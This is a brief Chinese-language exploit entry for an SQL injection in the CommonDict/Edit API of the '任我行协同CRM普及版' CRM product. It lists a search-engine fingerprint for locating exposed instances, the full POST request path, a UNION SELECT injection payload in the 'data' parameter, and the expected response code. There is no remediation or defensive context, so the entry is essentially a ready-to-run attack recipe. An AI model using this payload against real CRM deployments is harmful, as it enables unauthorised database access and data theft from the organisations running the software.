# 任我行协同CRM普及版CommonDictEditSQL注入漏洞

任我行协同CRM普及版CommonDictEdit ｜ SQL注入 ｜ —
- **指纹**：`app="任我行-CRM"`
- **请求**：`POST /crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1&timestamp=1&nonce=1&signature=1 HTTP/1.1`

**Payload**
```
enumType=69&data={"ID":"1","Name":"'+UNION+ALL+SELECT+@@VERSION--"}
```
- **响应特征**：200